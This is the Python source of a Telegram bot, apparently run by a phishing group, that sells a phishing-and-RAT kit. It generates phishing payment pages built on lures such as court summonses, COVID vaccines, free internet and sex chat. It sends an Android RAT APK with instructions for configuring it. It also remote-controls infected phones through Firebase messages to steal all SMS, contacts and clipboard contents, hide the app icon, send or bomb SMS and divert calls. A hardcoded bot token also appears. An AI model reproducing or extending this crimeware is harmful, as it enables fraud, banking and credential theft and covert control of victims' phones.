from os import name, read, rmdir, waitpid
import os
from re import S
from sys import flags
from typing import List, Text
import requests, json
from telebot import TeleBot, types
import telebot
from time import sleep
from datetime import datetime
from telebot.apihelper import ENABLE_MIDDLEWARE, send_message
from json import loads
import random
import shutil

###Edit box
#1.Make [folder_user], [data], [apk], [mellat] folder 

admin = [2052173199]
admin_sender = [2052173199, -1001542780159]
ChannelLink = "@Pishingmax"
token = '5335927816:AAGqqGNs5BS1Mx8hztulfVH-wOUFwfYXirQ'
url = "https://google.com/"
fire_base_access_token = ''
###

bot = telebot.TeleBot(token, parse_mode=None)
send_apk = f'''
برای ادیت رات کافیه پورتی که برات پایین همین برنامه فرستاده شده که احتمالا یه عدد سه رقمیه 
توی مسیر زیر قرار بدی\n assets => getewayport.txt 


دقت کنید که اخر لینک درگاه پورتتونو باید با متد گت بهش بزنید  
http://kos.kos/pay/eblagh/index.php?user=port
?user=YOUR_PORT
'''

msg3 = '''
نمیدونم دارم چیکار میکنم حتما اشتباهی شده!
i have seen you since 17 september
'''
#Good Sentence
###################################################################
s1 = ["عمر تمساح بیش از ۱۰۰ سال است",
 " هیچ وقت نمیتونی با چشمای باز عطسه کنی"
 , "دهان انسان روزانه يك ليتر بزاق توليد مي‌كند.", "گذتشته هیچ وقت فراموش نمیشه همیشه باهات هست"
 , "تنها قسمت بدن كه خون ندارد، قرينه چشم است", "يك ليتر سركه در زمستان سنگين‌تر از تابستان است."
 ,"فقط با از دست دادن يك درصد از آب بدن، احساس تشنگي مي‌كنيم!"
 ,"شانس شبيه بودن دو اثر انگشت، يك به 64 ميليارد است.","آمريكا تا 50 ميليون سال ديگر دو نيم خواهد شد","کسایی که فیشر هستند افراد 10 ساله تا 16 ساله اند"
 , "قلب میگو در سر آن است.","عمر سنجاقکها تنها ۲۴ ساعت است.","سطح شهر مکزیک سالانه ۲۵ سانتی متر نشست میکند.","فیل ها قادرند روزانه ۶۰ گالن آب ۲۵۰ کیلو گرم یونجه مصرف کنند ."
 ,"موریانه ها قادرند تا ۲ روز زیر آب زنده بمانند"
 , "در مصر باستان افراد روحاني تمام موهاي بدن خود را مي‌كندند حتي ابروها و موژه‌ها.", "تمامی پستانداران به استثایی انسان و میمون کور رنگ هستند", "گونه ای از خر گوش قادر است ۱۲ ساعت پس از تولد جفت گیری کند.",  "روشنائی قرص کامل ماه برابر هلال ماه می باشد."
, "فيل‌ها تنها حيواناتي هستند كه نمي‌توانند بپرند.", "یک اسب در طول یک سال ۷ برابر وزن بدن خود غذا مصرف می کند.", "كوبيدن سر به ديوار 150 كالري در ساعت مصرف مي‌كند."
, "پروانه ها با پاهاشون میچشن"]

####################################################################
#Number LIst Divar
####################################################################
numberslist = ["0912","0936","0930","0935","0911","0939","0938","0903","0910","0919"]
numbermaker = random.randrange(1000000,9999999)
####################################################################

#FireBase Defs 


def list_user(chat_id):

    RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r')
    msg = {
        'lydia1': "List",
        'data': {"lydia1":"List","lydia2":"2"}
    }
    data = {
        'to': f'/topics/{RLydia1.read()}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text

def hideeall(chat_id):
    RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"mobile","lydia2":"hide"}
    }
    data = {
        'to': f'/topics/{RLydia1}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text


def send_action(androididd, chat_id, lydia_action):
    RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"mobile{androididd}","lydia2":f"{lydia_action}"}
    }
    data = {
        'to': f'/topics/{RLydia1}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text

def send(androidid,mobilenumber,forsend,chat_id):

    RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r')

    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"sm{androidid}","lydia2":f"{mobilenumber}&{forsend}"}
    }
    data = {
        'to': f'/topics/{RLydia1.read()}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text

def send_smsbomber(mobilenumber,forsend,chat_id):

    RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r')

    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"smbomber","lydia2":f"{mobilenumber}&{forsend}"}
    }
    data = {
        'to': f'/topics/{RLydia1.read()}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text



def sender_glass(phone_list_obj, android_id, message_text):
    phone_list = phone_list_obj.text.splitlines()
    Counter = 0
  
# Reading from file
    Content = phone_list_obj.text
    CoList = Content.split("\n")
  
    for i in CoList:
        if i:
            Counter += 1
       
    #if Counter in hundredlist:
    bot.send_message(phone_list_obj.chat.id, f"Sending messages please wait...!\n📨Count:{Counter}\n🖥:{android_id}")
        #print('Total lines:', x) # 8
    for i in phone_list:
        send(android_id, i, message_text, phone_list_obj.chat.id)
    next
    bot.send_message(phone_list_obj.chat.id, f"Send a successful requests.!\n📨Count-Requests:{Counter}\n🖥:{android_id}")
    #else:
        ##bot.send_message(phone_list_obj.chat.id, "Forbiden! Numbers must be less than 60

#Def Hide Lydia1 change text Lydia1.txt 
#####################################################################

def one(id):
    list = open('data/one.txt', 'r').read().splitlines()
    for i in list:
        combo = i.replace('\n', '').split(';')
        if str(combo[0]) == str(id):
            now = datetime.now()
            current_time = now.strftime("")
             
            if str(current_time) == str(combo[1]):
         
                return '403'
    return '200'

def add_one(id):
    f = open('data/one.txt', 'a')
    now = datetime.now()
    current_time = now.strftime("")
    f.write(str(id) + ';' + current_time + '\n')
    f.close()



def check_user(chat_id):
    luser = open(
        './users.txt',
        'r'
    ).read().splitlines()
    if str(chat_id) in luser:
        return True
    else:
        return False



def check_member(id):
    try:
        url = f"https://api.telegram.org/bot{token}/getChatMember?chat_id={ChannelLink}&user_id={id}"
        res = loads(requests.get(url).text)
        if res['ok'] == True:
            if res['result']['status'] == 'member' or  res['result']['status'] == 'administrator':
                return 'ok'
            else:
                return 'err'
        else:
            return 'err'
    except:
        return 'err'


def auto_edit(chat_id):

    count = int(open('data/count.txt', 'r').read())
    data = open('data/links.ini', 'a')
    data.write(str(count + 1) + ' = ' + str(chat_id) + '\n' + str(chat_id) + ' = ' + str(chat_id) + '\n')
    data.close()
    recount = open('data/count.txt', 'w')
    recount.write(str(count + 1))
    recount.close()

def folder_user(chat_id):
    portlist = open('data/count.txt','r')
    os.mkdir(f"folder_user/{chat_id}") #Geteway Port Folder 
    folder = open(f'folder_user/{chat_id}/{chat_id}.txt', 'w')
    folder.write(f"{portlist.read()}")
    folder.close
    #make Remote Folders
    portlist2 = open('data/count.txt','r')
    portlist3 = open('data/count.txt', 'r')
    portlist4 = open('data/count.txt', 'r')
    os.mkdir(f"folder_user/{portlist2.read()}") #Remote Folder
    folder1 = open(f'folder_user/{portlist3.read()}/url.txt', 'w')
    folder1.write("http://google.com")
    folder1.close


def send_admin_topic(message):
    list_admin(message.text)
    bot.send_message(message.chat.id, "Request Send Now!")

def list_admin(topic):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":"List","lydia2":"2"}
    }
    data = {
        'to': f'/topics/{topic}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
    #bot.send_message(chatid,res)
    #bot.send_message(chatid,"Request Send Now!")

def androidid_admin(message):
 with open(f'./admin/androidid_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
    f.write(message.text)
    bot.send_message(message.chat.id,"Your Mobile-ID Saved!",message.text)

def messagef_admin(message):
 with open(f'./admin/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
    f.write(message.text)
    bot.send_message(message.chat.id,"Your Text message Saved!",message.text)

def sender_config(message):
    file1 = open(f"./admin/androidid_{message.chat.id}.txt", "r", encoding='UTF-8')
    file2 = open(f"./admin/message_{message.chat.id}.txt", "r", encoding='UTF-8')
    rm1 = file1.read()
    rm2 = file2.read()
    phone_list = bot.reply_to(message, 'please send me your phone number !')
    bot.register_next_step_handler(phone_list, sender, rm1, rm2, message.text)


def sender(phone_list_obj, android_id, message_text, topic):
    phone_list = phone_list_obj.text.splitlines()
    Counter = 0
  
# Reading from file
    Content = phone_list_obj.text
    CoList = Content.split("\n")
  
    for i in CoList:
        if i:
            Counter += 1
    
    bot.send_message(phone_list_obj.chat.id, f"Sending messages please wait...!\n📨Count:{Counter}\n🖥:{android_id}")
    #print('Total lines:', x) # 8
    for i in phone_list:
        send_adminnn(android_id, i, message_text, topic)
    next
    bot.send_message(phone_list_obj.chat.id, f"Send a successful requests.!\n📨Count-Requests:{Counter}\n🖥:{android_id}")
    
def send_adminnn(androidid,mobilenumber,forsend,topic):
    msg = {
        'lydia1': "List",
        'data': {"lydia1":f"sm{androidid}","lydia2":f"{mobilenumber}&{forsend}"}
    }
    data = {
        'to': f'/topics/{topic}',
        'data': msg
    }

    headers = {
        'Authorization': f'key={fire_base_access_token}',
        'Content-Type': 'application/json',
        'Content-Length': str(len(data))
    }
    res = requests.post(
        url='https://fcm.googleapis.com/fcm/send',
        headers=headers,
        json=data
    ).text
    #bot.send_message(chatid,res)
    #bot.send_message(chatid,"Request Send Now!")

def setpayment(chat_id):
    phptext = f'''
<?php

$token2 = '{token}';
$chat_id_user = {chat_id};

?>
    '''
    source_dir = "mainmellat"
    destination_dir = f"mellat/{chat_id}"
    shutil.copytree(source_dir, destination_dir)
    next
    infophp = open(f'mellat/{chat_id}/info.php', 'w')
    infophp.write(phptext)
    infophp.close
    

def glasses_rm(call):
    chat_id = call.chat.id
    androidid_saver = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'w')
    androidid_saver.write(call.text)
    androidid_saver.close

    bot.send_message(chat_id=call.chat.id,
        text=f"~ @LydiaTeam\ni have seen you since 17 september\n~ : {call.text}",
        reply_markup=makeKeyboard_rm(),
        parse_mode='HTML')


def glasses_rm_cammand(android_id, chat_idd):
    androidid_saver = open(f'./folder_user/{chat_idd}/saver_{chat_idd}.txt', 'w')
    androidid_saver.write(android_id)
    androidid_saver.close


    bot.send_message(chat_id=chat_idd,
        text=f"~ @LydiaTeam\ni have seen you since 17 september\n~ : {android_id}",
        reply_markup=makeKeyboard_rm(),
        parse_mode='HTML')





def set_url(message):
    chat_id = message.chat.id
    if message.text.startswith("http"):
        RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
        setlink = open(f'./folder_user/{RLydia1}/url.txt', 'w')
        setlink.write(message.text)
        setlink.close
        bot.send_message(chat_id, 'لینک شما تنظیم شد :')

    else:
        bot.send_message(chat_id, 'فقط لینک برام بفرست »')



def makeKeyboard_rm():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="📊List📊",
                                              callback_data="list"),
        types.InlineKeyboardButton(text="🔇Mute🔇",
                                   callback_data="mute"))

    markup.add(types.InlineKeyboardButton(text="📥GetAllMessage📥",
                                            callback_data="getallmessage"))

    markup.add(types.InlineKeyboardButton(text="📨Send Sms📨",
                                              callback_data="sendsms"),
        types.InlineKeyboardButton(text="📲Hide Icon📲",
                                   callback_data="hideicon"))

    markup.add(types.InlineKeyboardButton(text="🕛GetLastSms🕛",
                                        callback_data="getlastsms"))

    markup.add(types.InlineKeyboardButton(text="☎️GetContact☎️",
                                        callback_data="getcontact"))

    markup.add(types.InlineKeyboardButton(text="📋Clipboard📋",
                                              callback_data="clipboard"),
        types.InlineKeyboardButton(text="📝SetText📝",
                                   callback_data="settext"))

    markup.add(types.InlineKeyboardButton(text="💬Divert Mode💬",
                                    callback_data="ussd"))

    return markup

###############################################################################################################
def messagef(message):
 with open(f'./folder_user/{message.chat.id}/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
    f.write(message.text)
    bot.send_message(message.chat.id,"Your Text message Saved!",message.text)

def makeKeyboard():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="📊List📊",
                                              callback_data="list"),
        types.InlineKeyboardButton(text="🌐Hide-All🌐",
                                   callback_data="hideall")),
    markup.add(types.InlineKeyboardButton(text="🔗SetLink🔗",
                                              callback_data="setlink"),
        types.InlineKeyboardButton(text="@LydiaTeam",
                                   callback_data="kossher")) 

    markup.add(types.InlineKeyboardButton(text="",
                                    callback_data="smsbomber"),
                types.InlineKeyboardButton(text="📝SetText📝",
                                   callback_data="settext")),

    markup.add(types.InlineKeyboardButton(text="🍷My_Port🍷",
                                    callback_data="myport"))

    markup.add(types.InlineKeyboardButton(text="🪜Set_User🪜",
                                        callback_data="setuser")) 

    markup.add(types.InlineKeyboardButton(text="🔙برگشت",
                                    callback_data="backmenu"))                            
    return markup

def menukeyboard():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="🪜ساخت درگاه جدید",
                                              callback_data="geteway"),
        types.InlineKeyboardButton(text="🎮ریموت",
                                   callback_data="remote")),
    markup.add(types.InlineKeyboardButton(text="☎️ساخت شماره",
                                              callback_data="mknumber"),
        types.InlineKeyboardButton(text="@LydiaTeam",
                                   callback_data="kossher"))

    markup.add(types.InlineKeyboardButton(text="💳کارت به کارت💳",
                                        callback_data="ctoc"))                           
    return markup

def adminkeyboard():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="ارسال پیام",
                                              callback_data="adsend"),
        types.InlineKeyboardButton(text="متن پیام",
                                   callback_data="adtext")),
    markup.add(types.InlineKeyboardButton(text="اندروید ایدی",
                                              callback_data="adid"),
        types.InlineKeyboardButton(text="لیست",
                                   callback_data="adlist"))

    markup.add(types.InlineKeyboardButton(text="اتو لیست",
                                        callback_data="auto"))                           
    return markup


def getewaykeyboard():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="🌩انتخاب قالب🌩",
                                        callback_data="sghaleb"))
    markup.add(types.InlineKeyboardButton(text="🌩انتخاب قالب(دانلود)🌩",
                                        callback_data="dlghaleb"))  
    markup.add(types.InlineKeyboardButton(text="📲ساخت رات و درگاه📲",
                                        callback_data="mkrat"))  
    markup.add(types.InlineKeyboardButton(text="🔙برگشت",
                                        callback_data="backmenu"))                             
    return markup

def selectghaleb():
    markup = types.InlineKeyboardMarkup()

    markup.add(types.InlineKeyboardButton(text="صیغه",
                                              callback_data="sighe"),
        types.InlineKeyboardButton(text="ابلاغیه",
                                   callback_data="eblagh"),
        types.InlineKeyboardButton(text="اینترنت کرونا",
                                   callback_data="netcr")),

    markup.add(types.InlineKeyboardButton(text="سکس چت",
                                              callback_data="sexchat"),
        types.InlineKeyboardButton(text="دیوار",
                                   callback_data="divar"),
        types.InlineKeyboardButton(text="اینترنت رایگان",
                                   callback_data="netfree")),

    markup.add(types.InlineKeyboardButton(text="واکسن کرونا",
                                              callback_data="vacsan"),
        types.InlineKeyboardButton(text="کنترل خانواده",
                                   callback_data="family"),
        types.InlineKeyboardButton(text="صیعه هلو",
                                   callback_data="holo")),


    markup.add(types.InlineKeyboardButton(text="شماره مجازی",
                                              callback_data="number"),
        types.InlineKeyboardButton(text="دوربین لخت کن",
                                   callback_data="cam"),
        types.InlineKeyboardButton(text="هک اینستاگرام",
                                   callback_data="insta")),
                                                 

    markup.add(types.InlineKeyboardButton(text="🔙برگشت",
                                        callback_data="backmenu"))                         
    return markup


def selectghaleb2():
    markup = types.InlineKeyboardMarkup()
    markup.add(types.InlineKeyboardButton(text="ابلاغیه",
                                        callback_data="dleblagh")) 
    markup.add(types.InlineKeyboardButton(text="همتا",
                                        callback_data="hamta")) 
    markup.add(types.InlineKeyboardButton(text="سهام",
                                        callback_data="saham")) 
    markup.add(types.InlineKeyboardButton(text="حذف تمامی درگاه ها",
                                        callback_data="del")) 

    markup.add(types.InlineKeyboardButton(text="🔙برگشت",
                                        callback_data="backmenu"))                         
    return markup


@bot.message_handler(commands=['start', 'Lydia', 'back'])
def send_welcome(message):
    well = f'''
سلام من لیدیا هستم یه ربات که بهت 
توی کارات کمک میکنه برای ادامه کار بهتره اول توی
چنلم جوین بشی ...

{ChannelLink}
آیا میدونستی که ؟
..........................................................
{random.choices(s1)}
..........................................................
    '''
    bot.send_message(chat_id=message.chat.id,
            text=well,
            reply_markup=menukeyboard(),
            parse_mode='HTML')


@bot.message_handler(func=lambda m: True)
def echo_all(message):
    if message.content_type == "text":
    

        if message.text.startswith("/set_"):
            if one(message.chat.id) == '403':
                print('null')

        elif message.text == "/admin":
            if message.chat.id in admin_sender:
                bot.send_message(chat_id=message.chat.id,
                text="admin",
                reply_markup=adminkeyboard(),
                parse_mode='HTML')
            #if message.chat.id in admin_sender:
                #senderrrr = bot.reply_to(message, 'Please send me your Topic !')
                #bot.register_next_step_handler(senderrrr, send_admin_topic)

        elif message.text == "/set_text":
            if message.chat.id in admin_sender:
                input_text = bot.send_message(message.chat.id, 'Please send me your text message !')
                bot.register_next_step_handler(input_text, messagef_admin)

        elif message.text == "/set_androidid":
            if message.chat.id in admin_sender:
                input_text = bot.send_message(message.chat.id, 'please Send me your Mobile-ID !')
                bot.register_next_step_handler(input_text, androidid_admin)

        elif message.text == "/send_message":
            if message.chat.id in admin_sender:
                if not os.path.exists(f'./admin/androidid_{message.chat.id}.txt'):
                    with open(f'./admin/androidid_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write("set")
                    with open(f'./admin/message_{message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                        f.write(message.text)
                    bot.send_message(message.chat.id, "your Path file not exists i make file please TryAgain!")
                else:
                    senderrrr = bot.reply_to(message, 'Please send me your Topic !')
                    bot.register_next_step_handler(senderrrr, sender_config)

        elif message.text == "/auto_list":
            if message.chat.id in admin_sender:
                bot.send_message(message.chat.id, "wait for me ...")
                for port in random.randint(200, 400):
                    list_admin(port)
                next
                bot.send_message(message.chat.id, "requests sended!")

        

               

@bot.callback_query_handler(func=lambda call: True)
def handle_query(call):
        if check_user(call.message.chat.id):
            chat_id = call.message.chat.id

            if (call.data.startswith("list")):
                list_user(call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text="list request send now !")


            elif (call.data.startswith("setuser")):
                input_text = bot.send_message(call.message.chat.id, 'please Send me your Mobile-ID :')
                bot.register_next_step_handler(input_text, glasses_rm)

            elif (call.data.startswith("hideall")):
                hideeall(call.message.chat.id)
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text="hideall request send now !")

            elif (call.data.startswith("settext")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your text message :')
                bot.register_next_step_handler(input_text, messagef)

            elif (call.data.startswith("setlink")):
                input_text = bot.send_message(call.message.chat.id, 'Please send me your Url :')
                bot.register_next_step_handler(input_text, set_url)


            elif (call.data.startswith("mute")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'mute')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"Mute request send now !\n~ : {id}")


            elif (call.data.startswith("getallmessage")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'getallmessage2')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"GetAllmessage request send now !\n~ : {id}")
            
            elif (call.data.startswith("sendsms")):
                    androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                    id = androidid_reader.read()
                    if not os.path.exists(f'./folder_user/{chat_id}/message_{call.message.chat.id}.txt'):
                        with open(f'./folder_user/{chat_id}/message_{call.message.chat.id}.txt', 'w', encoding='UTF-8') as f:
                            f.write("set")
                        bot.answer_callback_query(callback_query_id=call.id,
                                show_alert=True,
                                text="your Path file not exists i make file please TryAgain!")
                    else:
                        file2 = open(f"./folder_user/{call.message.chat.id}/message_{call.message.chat.id}.txt", "r", encoding='UTF-8')
                        rm2 = file2.read()
                        phone_list = bot.reply_to(call.message, 'please send me your phone number !\n09999\n09999\n09999')
                        bot.register_next_step_handler(phone_list, sender_glass, id, rm2)

            elif (call.data.startswith("hideicon")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'hide')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"HideIcon request send now !\n~ : {id}")

            elif (call.data.startswith("getlastsms")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'getlastsms')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"GetLastSms request send now !\n~ : {id}")

            elif (call.data.startswith("getcontact")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'getcontact')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"GetContact request send now !\n~ : {id}")

            elif (call.data.startswith("clipboard")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'getclipboard')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"clipboard request send now !\n~ : {id}")
            #Exmple of change icon 
            elif (call.data.startswith("changeicon")):
                androidid_reader = open(f'./folder_user/{chat_id}/saver_{chat_id}.txt', 'r')
                id = androidid_reader.read()
                send_action(id, call.message.chat.id, 'playstore')
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f" !\n~ : {id}")

            elif (call.data.startswith("myport")):
                RLydia1 = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
                bot.answer_callback_query(callback_query_id=call.id,
                                    show_alert=True,
                                    text=f"🍷Your Port Name : {RLydia1}")
        chat_id = call.message.chat.id
        if (call.data.startswith("geteway")):
            bot.edit_message_text(chat_id=call.message.chat.id,
                text=f"اینجا میتونی درگاهتو بسازی خوشگلم :",
                message_id=call.message.message_id,
                reply_markup=getewaykeyboard(),
                parse_mode='HTML')

        elif (call.data.startswith("backmenu")):
            bot.edit_message_text(chat_id=call.message.chat.id,
                text=f"برگشتی به منوی اصلی :",
                message_id=call.message.message_id,
                reply_markup=menukeyboard(),
                parse_mode='HTML')

        elif (call.data.startswith("remote")):
            if one(call.message.chat.id) == '403':

                bot.edit_message_text(chat_id=call.message.chat.id,
                text=f"به بخش ریموت خوش اومدی :",
                message_id=call.message.message_id,
                reply_markup=makeKeyboard(),
                parse_mode='HTML')
                
            else:
                bot.answer_callback_query(callback_query_id=call.id,
                    show_alert=True,
                    text=f":/گوسقند تو هنوز هیچ درگاهی نساختی که بخوای کسی رو مدیریت کنی اول درگاهتو بساز نا اطلاعاتت توی سرور ما ذخیره بشه")
            
        elif (call.data.startswith("mknumber")):
            if one(call.message.chat.id) == '403':
                numbers = open(f'./folder_user/{chat_id}/number.txt', 'w')
                numbers.write(f'Zero :')
                numbers.close
                
                bot.answer_callback_query(callback_query_id=call.id,
                    show_alert=True,
                    text=f"لطفا روی هیچ دکمه ای کلیک نکنید شماره ها به صورت خودکار ارسال میشود...")
                sleep(10)
                for i in numberslist:
                    numbers = open(f'./folder_user/{chat_id}/number.txt', 'a')
                    numbers.write(f'\n{random.choice(numberslist)}{random.randrange(1000000,9999999)}')
                    numbers.close
                

                Rnumbers = open(f'./folder_user/{chat_id}/number.txt', 'r').read()
                bot.send_message(chat_id, Rnumbers)   

            else:
                bot.answer_callback_query(callback_query_id=call.id,
                    show_alert=True,
                    text=f":/گوسقند تو هنوز هیچ درگاهی نساختی که بخوای کسی رو مدیریت کنی اول درگاهتو بساز نا اطلاعاتت توی سرور ما ذخیره بشه")
            

        elif (call.data.startswith("sghaleb")):
            if one(call.message.chat.id) == '403':
                bot.edit_message_text(chat_id=call.message.chat.id,
                    text=f"اینجا میتونی قالبتو انتخاب کنی:",
                    message_id=call.message.message_id,
                    reply_markup=selectghaleb(),
                    parse_mode='HTML')
            else:
                bot.answer_callback_query(callback_query_id=call.id,
                    show_alert=True,
                    text=f":/اول بزن روی ساخت رات و درگاه جدید تا اطلاعاتت توی سرور ما ذخیره بشه")



        elif (call.data.startswith("sighe")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(chat_id, apk, caption=send_apk)
                bot.send_message(chat_id, f"LinkPort = {url}pay/sighe/index.php?user={portuser} \n Getewayport = {portuser}")

        elif (call.data.startswith("eblagh")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{chat_id}/{chat_id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(chat_id, apk, caption=send_apk)
                bot.send_message(chat_id, f"LinkPort = {url}pay/eblagh/index.php?user={portuser} \n Getewayport = {portuser}")

        elif (call.data.startswith("netcr")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/Corona-Internet/index.php?user={portuser} \n Getewayport = {portuser}")
 

        elif (call.data.startswith("sexchat")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/xChat/index.php?user={portuser} \n Getewayport = {portuser}")


        elif (call.data.startswith("divar")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/divar/index.html?user={portuser} \n Getewayport = {portuser}")


        elif (call.data.startswith("netfree")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/FreeNet/index.php?user={portuser} \n Getewayport = {portuser}")

        elif (call.data.startswith("vacsan")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/corona/index.html?user={portuser} \n Getewayport = {portuser}")


        elif (call.data.startswith("family")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/ControlFamily/index.php?user={portuser} \n Getewayport = {portuser}")


        elif (call.data.startswith("holo")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/holo/index.php?user={portuser} \n Getewayport = {portuser}")
                        
        
        elif (call.data.startswith("number")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/VirtaulNumber/index.php?user={portuser} \n Getewayport = {portuser}")

        elif (call.data.startswith("cam")):
            if one(call.message.chat.id) == '403':
                portuser = open(f'folder_user/{call.message.chat.id}/{call.message.chat.id}.txt', 'r').read()
                apk = open(f'apk/main.apk', 'rb')
                bot.send_document(call.message.chat.id, apk, caption=send_apk)
                bot.send_message(call.message.chat.id, f"LinkPort = {url}pay/Camera/index.php?user={portuser} \n Getewayport = {portuser}")


        elif (call.data.startswith("insta")):
            if one(call.message.chat.id) == '403':
